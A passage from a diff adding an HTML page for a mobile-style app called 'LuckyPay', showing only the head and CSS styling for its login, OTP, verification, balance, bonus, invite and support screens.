@@ -1,0 +1,1989 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0e8c3f">
+<title>LuckyPay</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600;700&family=Baloo+2:wght@500;600;700;800&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+:root{
+  --green:#22c55e;--greenD:#16a34a;--greenDeep:#0a6b2f;--greenGlow:rgba(34,197,94,.5);
+  --blue:#3b82f6;--blueDeep:#1e3a8a;--blueGlow:rgba(59,130,246,.5);
+  --red:#ef4444;--redDeep:#7f1d1d;--redGlow:rgba(239,68,68,.45);
+  --amber:#f59e0b;--amberDeep:#7c2d12;--amberGlow:rgba(245,158,11,.45);
+  --purple:#8b5cf6;--purpleDeep:#4c1d95;--purpleGlow:rgba(139,92,246,.45);
+  --wa:#25d366;--waDeep:#075e54;
+  --ink:#0d2b1a;--muted:#6b8a78;--line:#e2efe7;
+  --toon:'Fredoka','Baloo 2','Trebuchet MS',sans-serif;
+}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+html,body{margin:0;padding:0;overflow-x:hidden;}
+body{font-family:var(--toon);font-weight:500;background:#dcece3;color:var(--ink);min-height:100vh;display:flex;justify-content:center;}
+.hidden{display:none!important;}
+.phone{width:100%;max-width:430px;min-height:100vh;background:#f3f9f4;position:relative;overflow-x:hidden;box-shadow:0 0 60px rgba(7,94,43,.2);}
+
+@keyframes sweep{0%{left:-45%}55%{left:125%}100%{left:125%}}
+@keyframes pop{from{opacity:0;transform:scale(.9);}to{opacity:1;transform:scale(1);}}
+@keyframes popBounce{0%{transform:scale(.85);}60%{transform:scale(1.05);}100%{transform:scale(1);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes fadeIn{from{opacity:0;}to{opacity:1;}}
+@keyframes slideInRight{from{opacity:0;transform:translateX(14px);}to{opacity:1;transform:translateX(0);}}
+@keyframes floaty{0%,100%{transform:translateY(0);}50%{transform:translateY(-4px);}}
+@keyframes softPulse{0%,100%{opacity:.55;}50%{opacity:.85;}}
+@keyframes pulseRing{0%{transform:scale(1);opacity:.45;}100%{transform:scale(1.25);opacity:0;}}
+@keyframes hourglassFlip{0%,100%{transform:rotate(0);}50%{transform:rotate(180deg);}}
+@keyframes payShimmer{0%{background-position:-200% 0;}100%{background-position:200% 0;}}
+@keyframes payBounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-4px);}}
+@keyframes arrowSlide{0%,100%{transform:translateX(0);}50%{transform:translateX(4px);}}
+@keyframes flipUpdate{0%{transform:scale(1);}50%{transform:scale(1.06);}100%{transform:scale(1);}}
+@keyframes shine{0%{transform:translateX(-100%) skewX(-20deg);}60%{transform:translateX(200%) skewX(-20deg);}100%{transform:translateX(200%) skewX(-20deg);}}
+@keyframes shake{0%,100%{transform:translateX(0);}25%{transform:translateX(-6px);}75%{transform:translateX(6px);}}
+@keyframes orbitRing{0%{transform:rotate(0);}100%{transform:rotate(360deg);}}
+@keyframes orbitRing2{0%{transform:rotate(360deg);}100%{transform:rotate(0);}}
+@keyframes wiggle{0%,100%{transform:rotate(-2deg);}50%{transform:rotate(2deg);}}
+@keyframes blob{0%,100%{border-radius:42% 58% 70% 30%/45% 45% 55% 55%;}50%{border-radius:60% 40% 55% 45%/40% 60% 45% 55%;}}
+@keyframes dotBounce{0%,100%{transform:translateY(0);}50%{transform:translateY(-5px);}}
+@keyframes heartbeat{0%,100%{transform:scale(1);}50%{transform:scale(1.04);}}
+@keyframes glowPulse{0%,100%{box-shadow:0 8px 0 #0a6b2f,0 10px 22px rgba(11,122,55,.3),0 0 24px var(--greenGlow);}50%{box-shadow:0 8px 0 #0a6b2f,0 10px 22px rgba(11,122,55,.3),0 0 36px var(--greenGlow);}}
+@keyframes popScale{0%{transform:scale(.85);opacity:0;}100%{transform:scale(1);opacity:1;}}
+
+#registerScreen,#loginScreen,#forgotScreen,#newPassScreen,#loginOtpScreen,#verifyScreen,#waitingScreen{
+  display:flex;flex-direction:column;justify-content:center;min-height:100vh;padding:26px 18px 34px;
+  background:radial-gradient(circle at 20% 10%,#e8f9ee 0%,#f3f9f4 50%,#dcece3 100%);position:relative;
+}
+.auth-blob{position:absolute;top:-60px;right:-60px;width:220px;height:220px;background:linear-gradient(135deg,#22c55e,#0a6b2f);opacity:.08;animation:blob 14s ease-in-out infinite;z-index:0;pointer-events:none;filter:blur(2px);}
+.auth-blob.b2{top:auto;bottom:-80px;left:-70px;width:240px;height:240px;background:linear-gradient(135deg,#3b82f6,#1e3a8a);animation-delay:4s;}
+.logo-orb{width:100px;height:100px;border-radius:34px;margin:0 auto 16px;background:linear-gradient(160deg,#4ade80,#22c55e 40%,#0a6b2f);display:flex;align-items:center;justify-content:center;font-size:46px;color:#fff;position:relative;box-shadow:0 12px 0 #0a6b2f,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(11,122,55,.35),0 0 38px var(--greenGlow),inset 0 4px 0 rgba(255,255,255,.45);animation:floaty 4s ease-in-out infinite;z-index:1;}
+.logo-orb::after{content:"";position:absolute;top:14px;left:20px;width:36px;height:14px;border-radius:50%;background:rgba(255,255,255,.55);filter:blur(7px);}
+.logo-orb::before{content:"";position:absolute;inset:-10px;border-radius:40px;border:2px dashed rgba(34,197,94,.35);animation:spin 30s linear infinite;}
+.logo-orb.blue-orb{background:linear-gradient(160deg,#60a5fa,#3b82f6 40%,#1e3a8a);box-shadow:0 12px 0 #1e3a8a,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(30,58,138,.35),0 0 38px var(--blueGlow),inset 0 4px 0 rgba(255,255,255,.45);}
+.logo-orb.blue-orb::before{border-color:rgba(59,130,246,.35);}
+.logo-orb.orange-orb{background:linear-gradient(160deg,#fbbf24,#f59e0b 40%,#7c2d12);box-shadow:0 12px 0 #7c2d12,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(124,45,18,.35),0 0 38px var(--amberGlow),inset 0 4px 0 rgba(255,255,255,.45);}
+
+.reg-title{font-size:32px;text-align:center;margin:0 0 6px;color:#0b3a1f;font-weight:700;letter-spacing:-.4px;text-shadow:0 2px 0 rgba(255,255,255,.9);}
+.reg-title .acc{background:linear-gradient(120deg,#22c55e,#0a6b2f);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;}
+.reg-sub{text-align:center;color:var(--muted);font-size:14.5px;margin:0 0 20px;font-weight:600;}
+.bonus-banner{position:relative;overflow:hidden;display:flex;align-items:center;gap:13px;padding:15px 18px;border-radius:22px;margin-bottom:18px;color:#fff;background:linear-gradient(135deg,#4ade80,#16a34a);box-shadow:0 7px 0 #0a6b2f,0 8px 0 rgba(0,0,0,.18),0 12px 22px rgba(11,122,55,.3),0 0 24px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.4);}
+.bonus-banner::after{content:"";position:absolute;top:-60%;left:-40%;width:50%;height:220%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.4),transparent);transform:rotate(18deg);animation:sweep 5s infinite;}
+.bonus-banner>i{font-size:34px;filter:drop-shadow(0 3px 4px rgba(0,0,0,.24));animation:wiggle 3s ease-in-out infinite;}
+.bb-small{font-size:11.5px;letter-spacing:1.8px;text-transform:uppercase;opacity:.92;font-weight:600;}
+.bb-big{font-size:26px;font-weight:700;letter-spacing:.3px;text-shadow:0 2px 0 rgba(0,0,0,.18);}
+
+.field{display:flex;align-items:center;gap:10px;background:#fff;border:2.5px solid #dcebe0;border-radius:18px;padding:0 15px;height:58px;margin-bottom:12px;box-shadow:0 4px 0 #dcebe0,0 5px 0 rgba(0,0,0,.08),0 8px 16px rgba(11,122,55,.08),inset 0 2px 0 rgba(255,255,255,.95);transition:border-color .2s, box-shadow .2s;}
+.field:focus-within{border-color:var(--green);box-shadow:0 5px 0 var(--greenD),0 6px 0 rgba(0,0,0,.12),0 0 0 4px rgba(34,197,94,.15),0 0 20px rgba(34,197,94,.3);}
+.field i{color:var(--greenD);font-size:17px;width:22px;text-align:center;flex:0 0 auto;}
+.field input{border:0;outline:0;flex:1;font-size:16px;background:transparent;color:var(--ink);font-family:var(--toon);font-weight:600;min-width:0;}
+.field input::placeholder{color:#a2bcae;font-weight:500;}
+.otp-row{display:flex;gap:9px;align-items:flex-start;}
+.otp-row .field{flex:1;margin-bottom:12px;}
+.btn-otp{height:58px;padding:0 18px;border:0;border-radius:18px;background:linear-gradient(180deg,#4ade80,#22c55e 50%,#16a34a);color:#fff;font-size:13px;letter-spacing:.5px;cursor:pointer;white-space:nowrap;text-shadow:0 2px 0 rgba(0,0,0,.18);box-shadow:0 5px 0 var(--greenDeep),0 6px 0 rgba(0,0,0,.12),0 6px 16px rgba(11,122,55,.28),0 0 18px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.35);transition:transform .08s, box-shadow .08s;font-family:var(--toon);font-weight:700;position:relative;overflow:hidden;}
+.btn-otp::before{content:"";position:absolute;top:0;left:-100%;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.3),transparent);animation:shine 6s ease-in-out infinite;}
+.btn-otp:disabled{opacity:.55;box-shadow:0 3px 0 var(--greenDeep);cursor:default;}
+.btn-otp:active:not(:disabled){transform:translateY(4px);box-shadow:0 1px 0 var(--greenDeep);}
+.hint{font-size:13px;color:var(--greenD);font-weight:700;margin:-4px 0 10px 5px;min-height:15px;}
+.hint.sent{background:#f0fdf4;border:2px dashed #86d9a6;border-radius:14px;padding:12px;color:var(--greenD);text-align:center;display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;margin:6px 0 12px;font-weight:700;animation:popBounce .4s ease;}
+.hint.sent i{color:var(--green);font-size:16px;}
+.hint.expired{background:#fef2f2;border:2px dashed #fecaca;border-radius:14px;padding:12px;color:var(--redDeep);text-align:center;display:flex;align-items:center;justify-content:center;gap:8px;font-size:13px;margin:6px 0 12px;font-weight:700;}
+
+.btn-primary{width:100%;height:60px;border:0;border-radius:22px;background:linear-gradient(180deg,#4ade80,#22c55e 50%,#16a34a);color:#fff;font-size:17px;letter-spacing:.4px;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:10px;text-shadow:0 2px 0 rgba(0,0,0,.18);box-shadow:0 7px 0 var(--greenDeep),0 8px 0 rgba(0,0,0,.2),0 14px 26px rgba(11,122,55,.35),0 0 28px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.4),inset 0 -2px 8px rgba(0,0,0,.15);transition:transform .08s, box-shadow .08s;margin-top:8px;font-family:var(--toon);font-weight:700;position:relative;overflow:hidden;}
+.btn-primary::before{content:"";position:absolute;top:0;left:-100%;width:50%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.32),transparent);animation:shine 5s ease-in-out infinite;}
+.btn-primary:active{transform:translateY(6px);box-shadow:0 1px 0 var(--greenDeep),0 2px 0 rgba(0,0,0,.15),0 3px 8px rgba(11,122,55,.24),0 0 18px var(--greenGlow);}
+.btn-primary i,.btn-primary span{position:relative;z-index:2;}
+.btn-primary.btn-blue{background:linear-gradient(180deg,#60a5fa,#3b82f6 50%,#1d4ed8);box-shadow:0 7px 0 var(--blueDeep),0 8px 0 rgba(0,0,0,.2),0 14px 26px rgba(29,78,216,.35),0 0 28px var(--blueGlow),inset 0 3px 0 rgba(255,255,255,.4),inset 0 -2px 8px rgba(0,0,0,.15);}
+.btn-primary.btn-blue:active{box-shadow:0 1px 0 var(--blueDeep),0 2px 0 rgba(0,0,0,.15),0 0 18px var(--blueGlow);}
+.btn-primary.btn-wa{background:linear-gradient(180deg,#25d366,#128c7e 50%,#075e54);box-shadow:0 7px 0 var(--waDeep),0 8px 0 rgba(0,0,0,.2),0 14px 26px rgba(7,94,84,.35),0 0 24px rgba(37,211,102,.4),inset 0 3px 0 rgba(255,255,255,.4);}
+.btn-primary:disabled{opacity:.6;cursor:not-allowed;}
+
+.forgot-link{display:block;text-align:center;margin-top:16px;color:var(--blue);font-weight:700;font-size:14.5px;text-decoration:none;cursor:pointer;padding:8px;}
+.tiny-note{text-align:center;font-size:12.5px;color:#8fa99b;margin:18px 0 0;font-weight:600;}
+.tiny-note i{color:var(--green);margin-right:5px;}
+
+.otp-wrap{width:100%;max-width:400px;margin:0 auto;position:relative;z-index:2;}
+.otp-orb{width:120px;height:120px;margin:0 auto 22px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#22c55e 40%,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:50px;position:relative;box-shadow:0 12px 0 #0a6b2f,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(11,122,55,.35),0 0 38px var(--greenGlow),inset 0 4px 0 rgba(255,255,255,.45);animation:payBounce 3s ease-in-out infinite;}
+.otp-orb::before,.otp-orb::after{content:"";position:absolute;inset:-12px;border-radius:50%;border:2.5px solid rgba(34,197,94,.4);animation:pulseRing 3s ease-out infinite;}
+.otp-orb::after{animation-delay:1.5s;}
+.otp-title{font-size:29px;font-weight:700;text-align:center;margin:0 0 8px;color:#0b3a1f;letter-spacing:-.3px;}
+.otp-desc{text-align:center;font-size:14.5px;color:var(--muted);margin:0 0 24px;font-weight:600;line-height:1.55;}
+.otp-desc b{color:var(--greenD);font-weight:700;letter-spacing:1.5px;font-size:16px;}
+.otp-box{width:100%;height:76px;border:3px solid #dcebe0;border-radius:22px;background:#fff;font-size:34px;font-weight:700;color:#0b3a1f;text-align:center;letter-spacing:18px;padding-left:18px;outline:none;transition:all .2s;margin-bottom:14px;box-shadow:0 5px 0 #dcebe0,0 6px 0 rgba(0,0,0,.08),inset 0 2px 0 rgba(255,255,255,.9);font-family:'Courier New',monospace;}
+.otp-box:focus{border-color:var(--green);box-shadow:0 5px 0 var(--greenD),0 0 0 4px rgba(34,197,94,.15),0 0 22px rgba(34,197,94,.28);}
+.otp-box::placeholder{letter-spacing:18px;color:#c8dcd0;padding-left:18px;}
+.timer-card{display:flex;align-items:center;gap:14px;background:#fff;border:2.5px solid #dcebe0;border-radius:20px;padding:15px 17px;margin-bottom:18px;box-shadow:0 5px 0 #dcebe0,0 6px 0 rgba(0,0,0,.08),0 0 16px rgba(34,197,94,.1);}
+.timer-ring{width:64px;height:64px;border-radius:50%;background:conic-gradient(#22c55e var(--p,100%),#e2efe7 0);display:flex;align-items:center;justify-content:center;flex:0 0 auto;position:relative;transition:background .5s;box-shadow:0 0 14px rgba(34,197,94,.35);}
+.timer-ring::before{content:"";position:absolute;inset:5px;border-radius:50%;background:#fff;box-shadow:inset 0 2px 4px rgba(11,122,55,.08);}
+.timer-ring span{position:relative;z-index:2;font-family:'Courier New',monospace;font-weight:700;font-size:17px;color:var(--greenD);}
+.timer-ring.warn{background:conic-gradient(#f59e0b var(--p,100%),#e2efe7 0);box-shadow:0 0 14px var(--amberGlow);}
+.timer-ring.warn span{color:var(--amberDeep);}
+.timer-ring.danger{background:conic-gradient(#ef4444 var(--p,100%),#e2efe7 0);box-shadow:0 0 14px var(--redGlow);}
+.timer-ring.danger span{color:var(--redDeep);}
+.timer-info{flex:1;min-width:0;}
+.timer-label{font-size:14.5px;font-weight:700;color:#0b3a1f;}
+.timer-sub{font-size:12.5px;color:var(--muted);margin-top:3px;font-weight:600;}
+.back-link{display:block;text-align:center;margin-top:16px;color:var(--muted);font-size:14px;font-weight:700;cursor:pointer;padding:8px;}
+.btn-ghost{width:100%;height:56px;border-radius:20px;margin-top:12px;border:2.5px solid #dcebe0;background:#f8fcf9;color:#5d8172;font-family:var(--toon);font-weight:700;font-size:15px;cursor:pointer;box-shadow:0 5px 0 #dcebe0,0 6px 0 rgba(0,0,0,.08);transition:transform .08s, box-shadow .08s;}
+.btn-ghost:active{transform:translateY(4px);box-shadow:0 1px 0 #dcebe0;}
+
+.verify-orb{width:130px;height:130px;margin:0 auto 24px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;font-size:54px;color:#fff;position:relative;box-shadow:0 12px 0 #0a6b2f,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(11,122,55,.35),0 0 42px var(--greenGlow),inset 0 4px 0 rgba(255,255,255,.45);animation:heartbeat 2s ease-in-out infinite;}
+.verify-orb i{animation:hourglassFlip 3.5s ease-in-out infinite;}
+.verify-orb::before,.verify-orb::after{content:"";position:absolute;inset:-16px;border-radius:50%;border:3px solid rgba(34,197,94,.4);animation:pulseRing 2.6s ease-out infinite;}
+.verify-orb::after{animation-delay:1.3s;}
+.verify-orb.reject-orb{background:linear-gradient(160deg,#f87171,#b91c1c);box-shadow:0 12px 0 #7f1d1d,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(185,28,28,.35),0 0 42px var(--redGlow),inset 0 4px 0 rgba(255,255,255,.3);}
+.verify-orb.reject-orb::before,.verify-orb.reject-orb::after{border-color:rgba(220,38,38,.4);}
+.verify-orb.reject-orb i{animation:none;}
+.verify-title{font-size:26px;font-weight:700;color:#0b3a1f;margin:0 0 10px;letter-spacing:-.3px;}
+.verify-title.reject{color:var(--red);}
+.verify-desc{font-size:14.5px;color:var(--muted);font-weight:600;line-height:1.55;margin:0 0 22px;}
+.verify-bar{width:100%;max-width:320px;height:8px;border-radius:4px;margin:0 auto 20px;background:linear-gradient(90deg,#d9eee3 0%,#22c55e 50%,#d9eee3 100%);background-size:200% 100%;animation:payShimmer 2.2s linear infinite;box-shadow:0 0 14px rgba(34,197,94,.35);}
+.verify-dots{display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:22px;}
+.verify-dots span{width:14px;height:14px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#16a34a);animation:dotBounce 1.6s ease-in-out infinite;box-shadow:0 3px 6px rgba(11,122,55,.28),0 0 10px rgba(34,197,94,.35);}
+.verify-dots span:nth-child(2){animation-delay:.2s;}
+.verify-dots span:nth-child(3){animation-delay:.4s;}
+.verify-status{display:inline-flex;align-items:center;gap:10px;padding:14px 22px;border-radius:28px;background:#fff7e6;border:2px solid #f5d98a;color:#8a5a00;font-weight:700;font-size:14.5px;box-shadow:0 5px 0 #e8c76a,0 0 16px rgba(245,158,11,.25);}
+.verify-status i{font-size:16px;animation:spin 1.6s linear infinite;display:inline-block;}
+
+.wait-orb-wrap{position:relative;width:170px;height:170px;margin:0 auto 26px;display:flex;align-items:center;justify-content:center;}
+.wait-ring{position:absolute;inset:0;border-radius:50%;border:2.5px solid #22c55e;animation:softPulse 3s ease-out infinite;}
+.wait-ring.delay1{animation-delay:1s;}
+.wait-ring.delay2{animation-delay:2s;}
+.wait-orb{width:120px;height:120px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#22c55e 40%,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:52px;position:relative;z-index:2;animation:payBounce 3s ease-in-out infinite;box-shadow:0 12px 0 #0a6b2f,0 13px 0 rgba(0,0,0,.15),0 18px 32px rgba(11,122,55,.35),0 0 42px var(--greenGlow),inset 0 4px 0 rgba(255,255,255,.45);}
+.wait-title{font-size:28px;font-weight:700;color:#0b3a1f;margin:0 0 10px;text-align:center;}
+.wait-sub{font-size:14.5px;color:var(--muted);font-weight:600;margin:0 0 22px;line-height:1.55;max-width:340px;text-align:center;align-self:center;}
+.wait-card{width:100%;max-width:350px;background:#fff;border:2.5px solid #d9eee3;border-radius:24px;padding:18px 20px;margin:0 auto 18px;box-shadow:0 6px 0 #d9eee3,0 7px 0 rgba(0,0,0,.08),0 0 20px rgba(34,197,94,.12);text-align:left;}
+.wait-row{display:flex;align-items:center;gap:12px;padding:10px 0;}
+.wait-row+.wait-row{border-top:2px dashed #eaf5ee;}
+.wait-row i{width:42px;height:42px;border-radius:14px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:15px;color:var(--greenD);background:#e9fbf0;border:2px solid #cdefdc;}
+.wait-row .lbl-s{font-size:11px;font-weight:700;color:var(--muted);letter-spacing:.9px;text-transform:uppercase;}
+.wait-row .val-s{font-size:15.5px;font-weight:700;color:var(--ink);margin-top:2px;}
+.wait-row .val-s.mono{letter-spacing:2px;color:var(--greenD);font-family:'Courier New',monospace;}
+
+#appScreen{display:flex;flex-direction:column;min-height:100vh;}
+.app-header{position:relative;overflow:hidden;color:#fff;padding:22px 18px 62px;border-radius:0 0 34px 34px;background:linear-gradient(160deg,#4ade80,#22c55e 50%,#0a6b2f);box-shadow:0 9px 0 #0a6b2f,0 10px 0 rgba(0,0,0,.15),0 12px 28px rgba(11,122,55,.3),0 0 32px rgba(34,197,94,.28),inset 0 -4px 12px rgba(0,0,0,.1),inset 0 2px 0 rgba(255,255,255,.25);}
+.app-header::before{content:"";position:absolute;top:-60px;right:-50px;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.1);}
+.app-header::after{content:"";position:absolute;bottom:-50px;left:-40px;width:170px;height:170px;border-radius:50%;background:rgba(255,255,255,.07);}
+.header-top{display:flex;align-items:center;gap:12px;position:relative;z-index:2;}
+.h-avatar{width:56px;height:56px;border-radius:18px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:24px;color:#fff;background:rgba(255,255,255,.2);border:3px solid rgba(255,255,255,.4);box-shadow:inset 0 2px 0 rgba(255,255,255,.35);overflow:hidden;}
+.h-avatar img{width:100%;height:100%;object-fit:cover;border-radius:15px;}
+.h-hi{font-size:12.5px;opacity:.92;font-weight:600;}
+.h-name{font-size:20px;font-weight:700;max-width:180px;text-shadow:0 2px 0 rgba(0,0,0,.15);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.h-badge{margin-left:auto;display:flex;align-items:center;gap:6px;background:rgba(255,255,255,.22);border:3px solid rgba(255,255,255,.4);padding:9px 15px;border-radius:16px;font-size:16px;font-weight:700;text-shadow:0 2px 0 rgba(0,0,0,.15);box-shadow:inset 0 2px 0 rgba(255,255,255,.3);}
+.app-main{padding:0 14px 110px;margin-top:-42px;position:relative;z-index:3;}
+.page{animation:fadeIn .3s ease;}
+
+.balance-card{position:relative;overflow:hidden;background:#fff;border:3px solid #d9eee3;border-radius:26px;padding:22px;box-shadow:0 9px 0 #d9eee3,0 10px 0 rgba(0,0,0,.1),0 14px 28px rgba(11,122,55,.15),0 0 30px rgba(34,197,94,.15),inset 0 2px 0 rgba(255,255,255,.8);}
+.balance-card::after{content:"";position:absolute;top:-60px;right:-50px;width:180px;height:180px;border-radius:50%;background:radial-gradient(circle,rgba(34,197,94,.12),transparent 70%);}
+.bc-label{font-size:12.5px;font-weight:700;color:var(--muted);letter-spacing:1.4px;text-transform:uppercase;}
+.bc-amount{font-size:52px;line-height:1.05;margin:6px 0 8px;font-weight:700;color:var(--greenD);letter-spacing:-2px;text-shadow:0 2px 8px rgba(34,197,94,.2);}
+.bc-amount.updated{animation:flipUpdate .6s ease;}
+.bc-foot{font-size:13.5px;color:var(--muted);font-weight:600;display:flex;align-items:center;gap:6px;}
+.bc-foot i{color:var(--green);}
+.bc-coin{position:absolute;right:16px;top:50%;transform:translateY(-50%);width:70px;height:70px;border-radius:50%;background:linear-gradient(160deg,#4ade80,#0a6b2f);display:flex;align-items:center;justify-content:center;color:#fff;font-size:30px;box-shadow:0 9px 0 #0a6b2f,0 10px 0 rgba(0,0,0,.15),0 12px 22px rgba(11,122,55,.35),0 0 28px var(--greenGlow),inset 0 3px 0 rgba(255,255,255,.4);animation:glowPulse 4s ease-in-out infinite;}
+.bonus-card{display:flex;align-items:center;gap:12px;background:linear-gradient(135deg,#f0fdf4,#e6f7ed);border:2.5px solid #c8ecd4;border-radius:22px;padding:15px 16px;margin-top:14px;box-shadow:0 5px 0 #c8ecd4,0 6px 0 rgba(0,0,0,.08),inset 0 2px 0 rgba(255,255,255,.9);}
+.icon-circle{width:52px;height:52px;border-radius:17px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;color:#fff;font-size:22px;background:linear-gradient(160deg,#4ade80,#0a6b2f);box-shadow:0 4px 0 #0a6b2f,0 0 14px var(--greenGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.bc-title{font-size:15.5px;font-weight:700;color:#0b5c2c;}
+.bc-sub{font-size:12.5px;color:#4d8a68;font-weight:600;margin-top:2px;}
+.ok{color:var(--green);margin-left:auto;font-size:24px;filter:drop-shadow(0 0 6px var(--greenGlow));}
+
+.invite-banner{display:flex;align-items:center;gap:13px;margin-top:14px;padding:16px 15px;border-radius:24px;cursor:pointer;background:linear-gradient(135deg,#f5e8ff,#e9d5ff);border:3px solid #c084fc;box-shadow:0 8px 0 #a855f7,0 9px 0 rgba(0,0,0,.18),0 14px 26px rgba(168,85,247,.2),0 0 26px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.8);transition:transform .08s, box-shadow .08s;position:relative;overflow:hidden;}
+.invite-banner::after{content:"";position:absolute;top:-50%;left:-40%;width:50%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);transform:rotate(18deg);animation:sweep 6s infinite;}
+.invite-banner:active{transform:translateY(5px);box-shadow:0 2px 0 #a855f7,0 3px 0 rgba(0,0,0,.12),0 0 14px var(--purpleGlow);}
+.invite-icon{width:58px;height:58px;border-radius:18px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;background:linear-gradient(160deg,#c084fc,#7c3aed);box-shadow:0 4px 0 #4c1d95,0 0 14px var(--purpleGlow),inset 0 2px 0 rgba(255,255,255,.3);position:relative;z-index:2;}
+.invite-info{flex:1;min-width:0;position:relative;z-index:2;}
+.invite-title{font-size:17px;font-weight:700;color:#6b21a8;}
+.invite-sub{font-size:12.5px;color:#9333ea;font-weight:600;margin-top:2px;}
+.invite-badge{display:inline-flex;align-items:center;gap:4px;background:#fff;border:2px solid #c084fc;padding:4px 10px;border-radius:12px;font-size:12px;font-weight:800;color:#6b21a8;margin-top:5px;}
+.invite-arrow{margin-left:auto;color:#7c3aed;font-size:22px;position:relative;z-index:2;animation:arrowSlide 2.5s ease-in-out infinite;}
+
+.purchase-card{display:flex;align-items:center;gap:13px;margin-top:14px;padding:17px 16px;border-radius:24px;cursor:pointer;background:linear-gradient(135deg,#fff9e6,#fdefc8);border:3px solid #f0d795;box-shadow:0 8px 0 #e8c76a,0 9px 0 rgba(0,0,0,.18),0 14px 26px rgba(234,179,8,.2),0 0 26px var(--amberGlow),inset 0 2px 0 rgba(255,255,255,.8);transition:transform .08s, box-shadow .08s;position:relative;overflow:hidden;}
+.purchase-card::after{content:"";position:absolute;top:-50%;left:-40%;width:50%;height:200%;background:linear-gradient(90deg,transparent,rgba(255,255,255,.5),transparent);transform:rotate(18deg);animation:sweep 6s infinite;}
+.purchase-card:active{transform:translateY(5px);box-shadow:0 2px 0 #e8c76a,0 3px 0 rgba(0,0,0,.12),0 0 14px var(--amberGlow);}
+.purchase-icon{width:58px;height:58px;border-radius:18px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;color:#fff;font-size:26px;background:linear-gradient(160deg,#fbbf24,#c2410c);box-shadow:0 4px 0 #7c2d12,0 0 14px var(--amberGlow),inset 0 2px 0 rgba(255,255,255,.3);position:relative;z-index:2;}
+.purchase-info{flex:1;min-width:0;position:relative;z-index:2;}
+.purchase-title{font-size:17px;font-weight:700;color:#78350f;}
+.purchase-sub{font-size:12.5px;color:#a16207;font-weight:600;margin-top:2px;}
+.purchase-arrow{margin-left:auto;color:#c2410c;font-size:22px;position:relative;z-index:2;animation:arrowSlide 2.5s ease-in-out infinite;}
+.support-card{display:flex;align-items:center;gap:13px;margin-top:14px;padding:17px 16px;border-radius:24px;cursor:pointer;background:linear-gradient(135deg,#eff6ff,#dbeafe);border:3px solid #bfdbfe;box-shadow:0 8px 0 #93c5fd,0 9px 0 rgba(0,0,0,.18),0 14px 26px rgba(37,99,235,.18),0 0 26px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.8);transition:transform .08s, box-shadow .08s;}
+.support-card:active{transform:translateY(5px);box-shadow:0 2px 0 #93c5fd,0 3px 0 rgba(0,0,0,.12),0 0 14px var(--blueGlow);}
+.support-icon{width:58px;height:58px;border-radius:18px;flex:0 0 auto;display:flex;align-items:center;justify-content:center;color:#fff;font-size:24px;background:linear-gradient(160deg,#60a5fa,#1d4ed8);box-shadow:0 4px 0 #1e3a8a,0 0 14px var(--blueGlow),inset 0 2px 0 rgba(255,255,255,.3);}
+.support-info{flex:1;min-width:0;}
+.support-title{font-size:17px;font-weight:700;color:#1e3a8a;}
+.support-sub{font-size:12.5px;color:#3b5a9a;font-weight:700;margin-top:2px;display:flex;align-items:center;gap:5px;}
+.support-arrow{margin-left:auto;color:#1d4ed8;font-size:22px;animation:arrowSlide 2.5s ease-in-out infinite;}
+
+.section-title{font-size:17px;font-weight:700;color:#0b3a1f;margin:24px 4px 14px;}
+.quick-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;}
+.quick-btn{background:#fff;border:2.5px solid #d9eee1;border-radius:22px;padding:18px 8px;cursor:pointer;font-family:var(--toon);display:flex;flex-direction:column;align-items:center;gap:10px;font-size:14.5px;font-weight:700;color:var(--greenD);box-shadow:0 8px 0 #d9eee1,0 9px 0 rgba(0,0,0,.1),0 12px 20px rgba(34,197,94,.1),inset 0 2px 0 rgba(255,255,255,.9);transition:transform .08s, box-shadow .08s;}
+.quick-btn:active{transform:translateY(5px);box-shadow:0 2px 0 #d9eee1,0 3px 0 rgba(0,0,0,.08);}
